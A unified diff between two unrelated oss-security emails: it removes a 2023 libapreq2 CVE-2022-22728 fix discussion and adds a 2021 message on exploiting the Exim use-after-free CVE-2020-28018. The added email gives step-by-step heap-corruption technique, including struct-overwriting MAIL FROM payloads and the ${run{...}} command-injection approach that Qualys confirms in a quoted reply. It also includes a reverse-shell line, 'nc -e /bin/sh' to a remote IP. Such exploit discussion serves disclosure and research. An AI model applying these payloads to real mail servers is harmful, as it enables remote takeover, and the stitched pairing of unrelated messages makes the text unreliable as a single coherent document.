@@ -1,4 +1,9 @@
-Received: (qmail 5998 invoked by uid 550); 3 Jan 2023 21:03:27 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5840" "Tuesday" "11" "May" "2021" "23:18:12" "+0200" "null p0int3r" "nullp0int3rx@gmail.com" nil "163" "Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question" nil nil nil "5" nil nil (number mark "U       nullp0int3rx May 11  163/5840  " thread-indent "\"Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 13662 invoked by uid 550); 11 May 2021 21:37:03 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,75 +12,206 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 2046 invoked from network); 3 Jan 2023 20:58:38 -0000
-Date: Tue, 3 Jan 2023 14:58:22 -0600
-From: John Helmert III <ajak@gentoo.org>
-To: oss-security@lists.openwall.com
-Cc: security@apache.org, jorton@apache.org, carnil@debian.org
-Message-ID: <Y7SW7g/J7I8h5jMD@gentoo.org>
-References: <d1b6acf9-0f59-1954-ccad-2243ca03d138@apache.org>
- <YwjuUy0a6FFdHPVB@gentoo.org>
- <Y61i4ojYhvXXx7Ap@eldamar.lan>
- <Y69d7JASugX99avX@gentoo.org>
- <CAHKPuKEiTO8uJi=sJxogt9ZUmvQ1o4mXT+bEb+6xBf=N7K_3-Q@mail.gmail.com>
- <Y7B0lbSvEhkIMdoq@gentoo.org>
- <CAHKPuKFDBmPF2So+g=VTkgniFGJpXHZ37kv+urCM-_j4pkjNRQ@mail.gmail.com>
+Received: (qmail 5894 invoked from network); 11 May 2021 21:18:35 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
+         :cc;
+        bh=NNL0nxj8qk6jDEdx/LPN7mxw1gQoaGZLhPZhxzssTX0=;
+        b=lY0avM8yimCkmxsM2kX0l/LoJ1av9g3xJqHqHpQYCgKI20jfdpwt1gqqcDxe66qk5+
+         ADG9P6b402FWy6OCdZAESgd1mf7j3+V8fTXTMmbd6jkmZbke9DFm/jCvWah8JXtz9rkq
+         jcNnLRU4Ac0k5SJCZQ7lJidVYNjhvJ1BsPsyyLRxKm3cy7l8zOZRqm5awU27i4c9SZV4
+         LWdkRqmoep+yKT7CxqSFeUD/1O62tcgSoxjYAomxwW+9gVi56fRMYZqR3HXpx+3J58aX
+         aZ9NNSeBfhB4kh2kWJ5N/x9JIzD6/jTDAqNgBN6vJPl+rFK+thP9EpoBy4NisZQZ7RtC
+         xQng==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to:cc;
+        bh=NNL0nxj8qk6jDEdx/LPN7mxw1gQoaGZLhPZhxzssTX0=;
+        b=Apf2OzbF8m155YFxK/qTZotMxj85FtW7+p5Ixaou5Th8+2uyMqVVkwuhROFle++60O
+         llsrdpQqK8BO0FHiA9FzMoPeewMpcaJnwJcLPKALEwgXR+SqAC5eH2tBrHpXC35T/sCk
+         q9C772o0/Me5d15L+71oauR9lVlC4CmmDgrKX0PHhlRn4YwZAn0siyftYUvmqq+3zA2q
+         0WHWU4CA8d21QjOKMMwZVWrRy8dRYQDjr9Dle3J5a+t2qvgi5DTWX7bsytD0/n2squBN
+         bdQ3wXfIk3kQlu/XxEcuknwjcRIas9N1OILnRZ/0rj6v+vffP3joznJ67AU4AA8WRkk6
+         yaxQ==
+X-Gm-Message-State: AOAM5313VUPypTijaIGOepfSaU4/R09JCP6v5TyzAKyj6ksmuC9MZ4ri
+	wq+d2Txfpxty66S7IEnEQDN9NZGfWgsV68J4T299HfXr8A==
+X-Google-Smtp-Source: ABdhPJwc1e0IJaL9a5mio0+EtphJNhnMcjBUl9j03zgeD08KH4jZOwaJjVGa5ejn0XutBVpkSiO7AlLM04Hjj7L0mzc=
+X-Received: by 2002:a05:6512:60f:: with SMTP id b15mr21335554lfe.518.1620767903967;
+ Tue, 11 May 2021 14:18:23 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="Q2feeH+zzSa2YjqD"
-Content-Disposition: inline
-In-Reply-To: <CAHKPuKFDBmPF2So+g=VTkgniFGJpXHZ37kv+urCM-_j4pkjNRQ@mail.gmail.com>
-Subject: Re: [oss-security] CVE-2022-22728: libapreq2: libapreq2 multipart
- form parse memory corruption
+References: <CAOni+oNB4JCe+Z=V+_bQGHBJ-HfN0AwVLC_H0qwVBsF0KKEoYQ@mail.gmail.com>
+ <20210511205319.GA22017@localhost.localdomain>
+In-Reply-To: <20210511205319.GA22017@localhost.localdomain>
+From: null p0int3r <nullp0int3rx@gmail.com>
+Date: Tue, 11 May 2021 23:18:12 +0200
+Message-ID: <CAOni+oOrTbyTC0szU3yvXKaygs=CB41ENj1kBG44c2d1KbGK3g@mail.gmail.com>
+To: Qualys Security Advisory <qsa@qualys.com>
+Cc: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="0000000000002ded9505c2146f20"
+Subject: Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question
 
---Q2feeH+zzSa2YjqD
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+--0000000000002ded9505c2146f20
+Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
-On Mon, Jan 02, 2023 at 12:51:04PM +0100, Arnout Engelen wrote:
-> On Sat, Dec 31, 2022 at 6:42 PM John Helmert III <ajak@gentoo.org> wrote:
-> > On Sat, Dec 31, 2022 at 10:54:00AM +0100, Arnout Engelen wrote:
-> > > On Fri, Dec 30, 2022 at 10:54 PM John Helmert III <ajak@gentoo.org> w=
-rote:
-> > > > On Thu, Dec 29, 2022 at 10:50:26AM +0100, Salvatore Bonaccorso wrot=
-e:
-> > > > > On Fri, Aug 26, 2022 at 11:01:23AM -0500, John Helmert III wrote:
-> > > > > > On Thu, Aug 25, 2022 at 02:09:16PM +0000, Joe Orton wrote:
-> > > > > > > A flaw in libapreq2 versions 2.16 and earlier could cause a b=
-uffer
-> > > > > > > overflow while processing multipart form uploads.
-> > > > > >
-> > > > > > Is there a fixed version or patch or upstream issue?
-> > >
-> > > libapreq2 2.17 was released on the same day as the advisory describing
-> > > the problem with 2.16 and earlier (https://httpd.apache.org/apreq/).
-> >
-> > Does it fix CVE-2022-22728? Whether or not it does isn't clear from
-> > the changelog [1], and I can't find a reference to the CVE elsewhere
-> > in the source tree.
->=20
-> I think https://svn.apache.org/viewvc?view=3Drevision&revision=3D1894937
-> contained the fix for this issue. This is included in 2.17.
+Hi again!
 
-Great! Can you add that as a reference to the CVE and note the fixed
-version in the description? Ideally, please also do this for future
-CVEs/advisories too, so remediation is clear to everyone.
+Thanks for the reply.
 
->=20
-> Kind regards,
->=20
-> Arnout
+In addition to my previous question, to leave it more clear...
 
---Q2feeH+zzSa2YjqD
-Content-Type: application/pgp-signature; name="signature.asc"
+I successfully exploited the Use-After-Free to get Heap Address Leak and
+the arbitrary read primitive mentioned in the advisory.
 
------BEGIN PGP SIGNATURE-----
+Talking about the arbitrary read, I sent a "MAIL FROM" command after the
+last "STARTTLS".
 
-iHUEABYKAB0WIQQyG9yfCrmO0LPSdG2gXq2+aa/JtQUCY7SW7AAKCRCgXq2+aa/J
-tQupAP9fr4F8ZMYDVbQfun9fYcF0R3bimNvGVgVo0lOkoMg4JQD+MhXL5S6H04Jq
-4g0mA4QOG0rChz7YBBzjAEzJPy+1IAo=
-=mXQd
------END PGP SIGNATURE-----
+When sending it after the STARTTLS (the last one before the UAF), the
+content sent is right next to the gstring freed buffer, something that does
+not happen when on plaintext, as the data is written far away from the
+target struct.
 
---Q2feeH+zzSa2YjqD--
+Then sending a MAIL FROM command with any data, allowed me to enter some of
+that data in the gstring freed struct.
+
+So... entering something like: MAIL FROM: <>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+AAAAAABBBBCCCCDDDDDDDD
+
+Would end up overwriting the g->size, g->ptr and g->s:
+
+g->size =3D 0x42424242
+g->ptr =3D 0x43434343
+g->s =3D 0x44444444
+
+Finally this will end up on arbitrary read, as having control of the
+gstring struct directly allow me read any address. When using this, the
+same response for that mentioned MAIL FROM command will contain the data
+where g->s points to. So I waste the chance of exploiting the UAF on it
+(but hopefully I can do it without any additional command).
+
+Also, perhaps receiving the "501 NUL characters are not allowed in SMTP
+commands" message, that response is written far away from my struct
+(because g->ptr contains a huge value), so no problem with it.
+
+That does not happen at the time of achieving a write-what-where, as this
+time, I depend on the response of the same command (because after the
+STARTTLS I have only one chance to exploit the UAF, else the pointer will
+be NULLed out).
+
+I though about sending a malformed-domain, so after overwriting the struct,
+part of response would be data I sent, in which a ${run{command}}  could
+exist:
+
+Sample: "501 ${run{command}} is an invalid address blablabla"
+
+This message would be entered where g->s points to.
+
+Unfortunately, the "501 NUL characters are not allowed in SMTP commands"
+message is used as response instead, so it is written into my target
+address instead of the data I want to.
+
+To avoid that message I though too about sending first a huge g->size
+value, then substract the value I use on g->ptr (like 0x01010101 to avoid
+NULLs) to the address I use to replace g->s.
+
+The only constraint of it is that as heap addresses contain at least 2 NULL
+bytes, the last part of the message would need to be the address and a new
+line character which is skipped on write, so if the buffer on that
+positions contain NULL bytes (something that happens as the last pointer
+stored there also contains 2 NULLs at the end as any heap address).
+
+Then if the previous data was:
+
+0x0000beefdeadbeef
+
+And I send: MAIL FROM: <>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+AAAAAABBBBCCCCDDDDDD
++
+<CRLF>
+
+The pointer would end up like this:
+
+0x0000444444444444
+
+In theory it would work but...unfortunately any reverse shell config length
+is higher than the number of characters from where I can start writing to
+the struct (26 bytes).
+
+[ 26-byte length space ] [ gstring struct ] [ ... ]
+^
+|
+|-------------- (start of my controlled buffer)
+
+
+strlen("${{nc -e /bin/sh 123.123.123.123 55555}}") =3D 40
+
+And I cannot add it after the gstring overwrite cause I need no more data
+as I do not want to enter non-NULL data on those two bytes for the address.
+
+So...
+
+How do you overwrite the gstring struct when you are on plaintext, so you
+can then freely send a MAIL FROM after the STARTTLS without facing those
+problems and directly getting it's response on target address previously
+corrupted?
+
+I saw some functions I could use for filling heap until overwriting my
+target, but they are just string-based so no NULL bytes possible.
+
+In the advisory it is mentioned the use of the name=3Dvalue pair, but readi=
+ng
+the code I see just string based functions used for allocations.
+
+Thanks again!
+Hope the question is more clear now
+
+El mar, 11 may 2021 a las 22:55, Qualys Security Advisory (<qsa@qualys.com>)
+escribi=C3=B3:
+
+> Hi,
+>
+> On Tue, May 11, 2021 at 01:23:43PM +0200, null p0int3r wrote:
+> > So I suppose that command is the first you send after the second
+> > "STARTTLS" command being sent right?
+>
+> Yes! After the second STARTTLS we send an invalid MAIL FROM command (for
+> example, "MAIL FROM:(\"${run{...}}\")\n"). Exim then responds with a 501
+> error message that includes our "${run{...}}" string, and since corked
+> in tls_write() is still non-NULL, this string is written to where the
+> used-after-free corked points to.
+>
+> Hopefully this helps!
+>
+> > PD: Congrats for those nice bugs discovered.
+>
+> Thank you very much for your mail!
+>
+> With best regards,
+>
+> --
+> the Qualys Security Advisory team
+>
+>
+> [https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png
+> ]<https://www.qualys.com/email-banner>
+>
+>
+>
+> This message may contain confidential and privileged information. If it
+> has been sent to you in error, please reply to advise the sender of the
+> error and then immediately delete it. If you are not the intended
+> recipient, do not read, copy, disclose or otherwise use this message. The
+> sender disclaims any liability for such unauthorized use. NOTE that all
+> incoming emails sent to Qualys email accounts will be archived and may be
+> scanned by us and/or by external service providers to detect and prevent
+> threats to our systems, investigate illegal or inappropriate behavior,
+> and/or eliminate unsolicited promotional emails (=E2=80=9Cspam=E2=80=9D).=
+ If you have any
+> concerns about this process, please contact us.
+>
+
+--0000000000002ded9505c2146f20--
